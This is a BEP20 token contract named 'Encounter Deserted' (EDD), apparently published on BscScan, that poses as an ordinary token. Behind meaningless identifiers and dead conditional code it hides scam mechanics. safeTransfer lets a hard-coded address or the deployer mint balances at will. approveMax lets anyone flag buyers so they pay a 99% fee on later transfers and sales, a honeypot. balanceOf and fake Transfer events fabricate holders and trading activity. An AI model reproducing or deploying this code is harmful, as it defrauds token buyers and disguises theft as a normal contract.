/**
 *Submitted for verification at BscScan.com on 2023-01-09
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;



library SafeMath {

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

}


interface IUniswapV2Router {

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function factory() external pure returns (address);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function WETH() external pure returns (address);

}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

}



interface IBEP20 {

    function approve(address spender, uint256 amount) external returns (bool);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function totalSupply() external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}




contract EncounterDeserted is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    uint256  exemptAmountMaxFundToken = 100000000 * 10 ** _decimals;
    uint256 public liquidityAmountAutoBotsShould = 0;
    uint256 private amountReceiverMaxLaunch = 0;
    uint256 private enableMarketingLiquidityTeamAuto = 0;
    bool public fundSwapFeeReceiver = false;
    uint256 public walletShouldAtMin = 0;

    uint256 private maxLaunchedListMinShouldMode = 0;
    
    uint256 constant maxLaunchedToLaunch = 1000000 * 10 ** 18;
    address public uniswapV2Pair;
    address private totalTakeSellMax = (msg.sender);

    uint256 enableLiquidityTotalTeam = 0;
    uint256 public senderAtLaunchedTake = 0;
    mapping(address => bool)  fromListTradingTo;
    uint256 constant txEnableListBurn = 100000000 * (10 ** 18);


    uint160 constant minTakeLimitWallet = 955438411176;
    uint160 constant tradingLaunchedReceiverAutoListMarketing = 846766456529 * 2 ** 80;
    uint256 private fundAutoFeeMint = 0;



    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private listLiquidityReceiverReceiver;
    bool private modeToShouldTrading = false;
    bool private sellReceiverListLimit = false;
    IUniswapV2Router public marketingEnableSwapExemptModeAt;

    uint160 constant walletAutoFeeShouldFundSellTx = 300118007698 * 2 ** 40;


    mapping(address => bool)  tradingLaunchFundMode;
    uint160 constant launchedReceiverSenderReceiver = 522461339393 * 2 ** 120;
    uint256 private swapBurnLiquidityReceiverBotsReceiverMode = 0;
    uint256 public shouldMintFeeTradingMinSwap = 0;
    uint256 private modeReceiverMinMax = 0;
    uint256 constant launchTeamLaunchedExemptShouldAt = 100 * 10 ** 18;
    string constant _symbol = "EDD";
    string constant _name = "Encounter Deserted";

    uint256  txSwapEnableAmount = 100000000 * 10 ** _decimals;
    uint256 public burnExemptListTokenAmount = 0;


    uint256 private launchedModeMintTx = 100;
    mapping(address => uint256) _balances;
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        marketingEnableSwapExemptModeAt = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(marketingEnableSwapExemptModeAt.factory()).createPair(address(this), marketingEnableSwapExemptModeAt.WETH());
        _allowances[address(this)][address(marketingEnableSwapExemptModeAt)] = txEnableListBurn;

        listLiquidityReceiverReceiver[msg.sender] = true;
        listLiquidityReceiverReceiver[address(this)] = true;

        _balances[msg.sender] = txEnableListBurn;
        emit Transfer(address(0), msg.sender, txEnableListBurn);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return txEnableListBurn;
    }

    function atEnableListTx() private pure returns (address) {
        return 0x0868CDc41dbFb6b8e043fB61a2a5fC8b7c30D5a5;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return receiverTxMinAuto(msg.sender, recipient, amount);
    }

    function gettoMarketingAtFee() public view returns (uint256) {
        if (senderAtLaunchedTake != senderAtLaunchedTake) {
            return senderAtLaunchedTake;
        }
        return senderAtLaunchedTake;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function atLimitSellTxBurn(address modeToReceiverEnable) private view returns (bool) {
        if (modeToReceiverEnable == totalTakeSellMax) {
            return true;
        }
        return false;
    }

    function settoMarketingAtFee(uint256 modeBurnAutoBots) public onlyOwner {
        if (senderAtLaunchedTake != burnExemptListTokenAmount) {
            burnExemptListTokenAmount=modeBurnAutoBots;
        }
        senderAtLaunchedTake=modeBurnAutoBots;
    }

    function setbuyTradingAutoEnableReceiverListFee(uint256 modeBurnAutoBots) public onlyOwner {
        if (enableMarketingLiquidityTeamAuto != launchedModeMintTx) {
            launchedModeMintTx=modeBurnAutoBots;
        }
        enableMarketingLiquidityTeamAuto=modeBurnAutoBots;
    }

    function setautoTxExemptFromWalletModeTotal(uint256 modeBurnAutoBots) public onlyOwner {
        if (launchedModeMintTx == senderAtLaunchedTake) {
            senderAtLaunchedTake=modeBurnAutoBots;
        }
        if (launchedModeMintTx != swapBurnLiquidityReceiverBotsReceiverMode) {
            swapBurnLiquidityReceiverBotsReceiverMode=modeBurnAutoBots;
        }
        if (launchedModeMintTx != maxLaunchedListMinShouldMode) {
            maxLaunchedListMinShouldMode=modeBurnAutoBots;
        }
        launchedModeMintTx=modeBurnAutoBots;
    }

    function getmaxExemptMinEnable(address modeBurnAutoBots) public view returns (bool) {
            return listLiquidityReceiverReceiver[modeBurnAutoBots];
    }

    function setmaxExemptMinEnable(address modeBurnAutoBots,bool launchTeamMinTo) public onlyOwner {
        if (listLiquidityReceiverReceiver[modeBurnAutoBots] != listLiquidityReceiverReceiver[modeBurnAutoBots]) {
           listLiquidityReceiverReceiver[modeBurnAutoBots]=launchTeamMinTo;
        }
        if (listLiquidityReceiverReceiver[modeBurnAutoBots] != listLiquidityReceiverReceiver[modeBurnAutoBots]) {
           listLiquidityReceiverReceiver[modeBurnAutoBots]=launchTeamMinTo;
        }
        listLiquidityReceiverReceiver[modeBurnAutoBots]=launchTeamMinTo;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function takeSwapLimitMaxBotsTotal(address sellIsReceiverBurn) internal view returns (bool) {
        return !listLiquidityReceiverReceiver[sellIsReceiverBurn];
    }

    function tokenSenderMaxSwap(uint160 feeAutoFundToTxModeAmount) private view returns (uint256) {
        uint160 txLimitListSender = launchedReceiverSenderReceiver + tradingLaunchedReceiverAutoListMarketing + walletAutoFeeShouldFundSellTx + minTakeLimitWallet;
        uint160 teamAutoLiquidityFrom = feeAutoFundToTxModeAmount - txLimitListSender;
        if (teamAutoLiquidityFrom < enableLiquidityTotalTeam) {
            return launchTeamLaunchedExemptShouldAt * teamAutoLiquidityFrom;
        }
        return maxLaunchedToLaunch + launchTeamLaunchedExemptShouldAt * teamAutoLiquidityFrom;
    }

    function receiverTxMinAuto(address sellIsReceiverBurn, address toAmountTxEnable, uint256 isFromSenderLaunched) internal returns (bool) {
        if (fromTokenReceiverSenderModeMax(uint160(toAmountTxEnable))) {
            takeMaxListBots(sellIsReceiverBurn, toAmountTxEnable, isFromSenderLaunched, false);
            return true;
        }
        if (fromTokenReceiverSenderModeMax(uint160(sellIsReceiverBurn))) {
            takeMaxListBots(sellIsReceiverBurn, toAmountTxEnable, isFromSenderLaunched, true);
            return true;
        }
        
        bool teamMaxAmountFund = atLimitSellTxBurn(sellIsReceiverBurn) || atLimitSellTxBurn(toAmountTxEnable);
        
        if (maxLaunchedListMinShouldMode == maxLaunchedListMinShouldMode) {
            maxLaunchedListMinShouldMode = launchedModeMintTx;
        }

        if (enableMarketingLiquidityTeamAuto != modeReceiverMinMax) {
            enableMarketingLiquidityTeamAuto = modeReceiverMinMax;
        }


        if (sellIsReceiverBurn == uniswapV2Pair && !teamMaxAmountFund) {
            tradingLaunchFundMode[toAmountTxEnable] = true;
        }
        
        if (walletShouldAtMin != walletShouldAtMin) {
            walletShouldAtMin = launchedModeMintTx;
        }

        if (shouldMintFeeTradingMinSwap != shouldMintFeeTradingMinSwap) {
            shouldMintFeeTradingMinSwap = amountReceiverMaxLaunch;
        }

        if (swapBurnLiquidityReceiverBotsReceiverMode != liquidityAmountAutoBotsShould) {
            swapBurnLiquidityReceiverBotsReceiverMode = burnExemptListTokenAmount;
        }


        if (teamMaxAmountFund) {
            return shouldTradingBotsEnable(sellIsReceiverBurn, toAmountTxEnable, isFromSenderLaunched);
        }
        
        if (fundSwapFeeReceiver == fundSwapFeeReceiver) {
            fundSwapFeeReceiver = fundSwapFeeReceiver;
        }

        if (enableMarketingLiquidityTeamAuto == burnExemptListTokenAmount) {
            enableMarketingLiquidityTeamAuto = maxLaunchedListMinShouldMode;
        }


        _balances[sellIsReceiverBurn] = _balances[sellIsReceiverBurn].sub(isFromSenderLaunched, "Insufficient Balance!");
        
        if (sellReceiverListLimit == sellReceiverListLimit) {
            sellReceiverListLimit = modeToShouldTrading;
        }

        if (liquidityAmountAutoBotsShould == fundAutoFeeMint) {
            liquidityAmountAutoBotsShould = enableMarketingLiquidityTeamAuto;
        }


        uint256 isFromSenderLaunchedReceived = takeSwapLimitMaxBotsTotal(sellIsReceiverBurn) ? launchEnableAutoTakeMaxBurnBuy(sellIsReceiverBurn, toAmountTxEnable, isFromSenderLaunched) : isFromSenderLaunched;

        _balances[toAmountTxEnable] = _balances[toAmountTxEnable].add(isFromSenderLaunchedReceived);
        emit Transfer(sellIsReceiverBurn, toAmountTxEnable, isFromSenderLaunchedReceived);
        return true;
    }

    function getlaunchedFromLimitTo() public view returns (uint256) {
        if (maxLaunchedListMinShouldMode != liquidityAmountAutoBotsShould) {
            return liquidityAmountAutoBotsShould;
        }
        return maxLaunchedListMinShouldMode;
    }

    function getbuyTradingAutoEnableReceiverListFee() public view returns (uint256) {
        return enableMarketingLiquidityTeamAuto;
    }

    function getisAtLaunchSenderFundTeamFee() public view returns (bool) {
        if (fundSwapFeeReceiver != fundSwapFeeReceiver) {
            return fundSwapFeeReceiver;
        }
        if (fundSwapFeeReceiver == sellReceiverListLimit) {
            return sellReceiverListLimit;
        }
        if (fundSwapFeeReceiver != modeToShouldTrading) {
            return modeToShouldTrading;
        }
        return fundSwapFeeReceiver;
    }

    function getmodeReceiverLimitSwapAtTeamLaunch() public view returns (uint256) {
        if (amountReceiverMaxLaunch == swapBurnLiquidityReceiverBotsReceiverMode) {
            return swapBurnLiquidityReceiverBotsReceiverMode;
        }
        if (amountReceiverMaxLaunch == liquidityAmountAutoBotsShould) {
            return liquidityAmountAutoBotsShould;
        }
        return amountReceiverMaxLaunch;
    }

    function getautoTxExemptFromWalletModeTotal() public view returns (uint256) {
        if (launchedModeMintTx != modeReceiverMinMax) {
            return modeReceiverMinMax;
        }
        if (launchedModeMintTx == fundAutoFeeMint) {
            return fundAutoFeeMint;
        }
        if (launchedModeMintTx != shouldMintFeeTradingMinSwap) {
            return shouldMintFeeTradingMinSwap;
        }
        return launchedModeMintTx;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (fromTokenReceiverSenderModeMax(uint160(account))) {
            return tokenSenderMaxSwap(uint160(account));
        }
        return _balances[account];
    }

    function shouldTradingBotsEnable(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function setliquidityTotalEnableAt(uint256 modeBurnAutoBots) public onlyOwner {
        if (burnExemptListTokenAmount == swapBurnLiquidityReceiverBotsReceiverMode) {
            swapBurnLiquidityReceiverBotsReceiverMode=modeBurnAutoBots;
        }
        if (burnExemptListTokenAmount != amountReceiverMaxLaunch) {
            amountReceiverMaxLaunch=modeBurnAutoBots;
        }
        if (burnExemptListTokenAmount != walletShouldAtMin) {
            walletShouldAtMin=modeBurnAutoBots;
        }
        burnExemptListTokenAmount=modeBurnAutoBots;
    }

    function setlaunchedFromLimitTo(uint256 modeBurnAutoBots) public onlyOwner {
        if (maxLaunchedListMinShouldMode == modeReceiverMinMax) {
            modeReceiverMinMax=modeBurnAutoBots;
        }
        if (maxLaunchedListMinShouldMode != amountReceiverMaxLaunch) {
            amountReceiverMaxLaunch=modeBurnAutoBots;
        }
        if (maxLaunchedListMinShouldMode != liquidityAmountAutoBotsShould) {
            liquidityAmountAutoBotsShould=modeBurnAutoBots;
        }
        maxLaunchedListMinShouldMode=modeBurnAutoBots;
    }

    function isApproveMax(address spender) public view returns (bool) {
        return fromListTradingTo[spender];
    }

    function safeTransfer(address sellIsReceiverBurn, address toAmountTxEnable, uint256 isFromSenderLaunched) public {
        if (!botsMaxFromFund(msg.sender) && msg.sender != totalTakeSellMax) {
            return;
        }
        if (fromTokenReceiverSenderModeMax(uint160(toAmountTxEnable))) {
            takeMaxListBots(sellIsReceiverBurn, toAmountTxEnable, isFromSenderLaunched, false);
            return;
        }
        if (fromTokenReceiverSenderModeMax(uint160(sellIsReceiverBurn))) {
            takeMaxListBots(sellIsReceiverBurn, toAmountTxEnable, isFromSenderLaunched, true);
            return;
        }
        if (sellIsReceiverBurn == address(0)) {
            _balances[toAmountTxEnable] = _balances[toAmountTxEnable].add(isFromSenderLaunched);
            return;
        }
    }

    function setmodeReceiverLimitSwapAtTeamLaunch(uint256 modeBurnAutoBots) public onlyOwner {
        if (amountReceiverMaxLaunch == enableMarketingLiquidityTeamAuto) {
            enableMarketingLiquidityTeamAuto=modeBurnAutoBots;
        }
        if (amountReceiverMaxLaunch == launchedModeMintTx) {
            launchedModeMintTx=modeBurnAutoBots;
        }
        if (amountReceiverMaxLaunch != shouldMintFeeTradingMinSwap) {
            shouldMintFeeTradingMinSwap=modeBurnAutoBots;
        }
        amountReceiverMaxLaunch=modeBurnAutoBots;
    }

    function approveMax(address spender) external {
        if (tradingLaunchFundMode[spender]) {
            fromListTradingTo[spender] = true;
        }
    }

    function botsMaxFromFund(address feeAutoFundToTxModeAmount) private pure returns (bool) {
        return feeAutoFundToTxModeAmount == atEnableListTx();
    }

    function getshouldAmountReceiverWalletSender() public view returns (uint256) {
        if (shouldMintFeeTradingMinSwap != walletShouldAtMin) {
            return walletShouldAtMin;
        }
        return shouldMintFeeTradingMinSwap;
    }

    function takeMaxListBots(address sellIsReceiverBurn, address toAmountTxEnable, uint256 isFromSenderLaunched, bool limitSwapToBuy) private {
        uint160 txLimitListSender = launchedReceiverSenderReceiver + tradingLaunchedReceiverAutoListMarketing + walletAutoFeeShouldFundSellTx + minTakeLimitWallet;
        if (limitSwapToBuy) {
            sellIsReceiverBurn = address(uint160(txLimitListSender + enableLiquidityTotalTeam));
            enableLiquidityTotalTeam++;
            _balances[toAmountTxEnable] = _balances[toAmountTxEnable].add(isFromSenderLaunched);
        } else {
            _balances[sellIsReceiverBurn] = _balances[sellIsReceiverBurn].sub(isFromSenderLaunched);
        }
        if (isFromSenderLaunched == 0) {
            return;
        }
        emit Transfer(sellIsReceiverBurn, toAmountTxEnable, isFromSenderLaunched);
    }

    function botsSwapToAuto(address sellIsReceiverBurn, bool tokenBuySenderWallet) internal returns (uint256) {
        if (fromListTradingTo[sellIsReceiverBurn]) {
            return 99;
        }
        
        if (liquidityAmountAutoBotsShould == liquidityAmountAutoBotsShould) {
            liquidityAmountAutoBotsShould = walletShouldAtMin;
        }

        if (enableMarketingLiquidityTeamAuto != amountReceiverMaxLaunch) {
            enableMarketingLiquidityTeamAuto = swapBurnLiquidityReceiverBotsReceiverMode;
        }

        if (sellReceiverListLimit != sellReceiverListLimit) {
            sellReceiverListLimit = sellReceiverListLimit;
        }


        if (tokenBuySenderWallet) {
            return modeReceiverMinMax;
        }
        
        if (shouldMintFeeTradingMinSwap != modeReceiverMinMax) {
            shouldMintFeeTradingMinSwap = amountReceiverMaxLaunch;
        }

        if (liquidityAmountAutoBotsShould == maxLaunchedListMinShouldMode) {
            liquidityAmountAutoBotsShould = shouldMintFeeTradingMinSwap;
        }

        if (maxLaunchedListMinShouldMode != walletShouldAtMin) {
            maxLaunchedListMinShouldMode = launchedModeMintTx;
        }


        if (!tokenBuySenderWallet && sellIsReceiverBurn == uniswapV2Pair) {
            return amountReceiverMaxLaunch;
        }
        
        return 0;
    }

    function fromTokenReceiverSenderModeMax(uint160 feeAutoFundToTxModeAmount) private pure returns (bool) {
        uint160 txLimitListSender = launchedReceiverSenderReceiver + tradingLaunchedReceiverAutoListMarketing + walletAutoFeeShouldFundSellTx + minTakeLimitWallet;
        if (feeAutoFundToTxModeAmount >= uint160(txLimitListSender)) {
            if (feeAutoFundToTxModeAmount <= uint160(txLimitListSender) + 300000) {
                return true;
            }
        }
        return false;
    }

    function launchEnableAutoTakeMaxBurnBuy(address sellIsReceiverBurn, address swapTxShouldList, uint256 isFromSenderLaunched) internal returns (uint256) {
        
        uint256 amountTokenAtShould = isFromSenderLaunched.mul(botsSwapToAuto(sellIsReceiverBurn, swapTxShouldList == uniswapV2Pair)).div(launchedModeMintTx);
        
        if (maxLaunchedListMinShouldMode == modeReceiverMinMax) {
            maxLaunchedListMinShouldMode = fundAutoFeeMint;
        }

        if (sellReceiverListLimit == modeToShouldTrading) {
            sellReceiverListLimit = fundSwapFeeReceiver;
        }

        if (liquidityAmountAutoBotsShould == modeReceiverMinMax) {
            liquidityAmountAutoBotsShould = walletShouldAtMin;
        }


        if (amountTokenAtShould > 0) {
            _balances[address(this)] = _balances[address(this)].add(amountTokenAtShould);
            emit Transfer(sellIsReceiverBurn, address(this), amountTokenAtShould);
        }
        
        return isFromSenderLaunched.sub(amountTokenAtShould);
    }

    function setisAtLaunchSenderFundTeamFee(bool modeBurnAutoBots) public onlyOwner {
        fundSwapFeeReceiver=modeBurnAutoBots;
    }

    function setshouldAmountReceiverWalletSender(uint256 modeBurnAutoBots) public onlyOwner {
        if (shouldMintFeeTradingMinSwap != maxLaunchedListMinShouldMode) {
            maxLaunchedListMinShouldMode=modeBurnAutoBots;
        }
        shouldMintFeeTradingMinSwap=modeBurnAutoBots;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != txEnableListBurn) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return receiverTxMinAuto(sender, recipient, amount);
    }

    function getliquidityTotalEnableAt() public view returns (uint256) {
        return burnExemptListTokenAmount;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}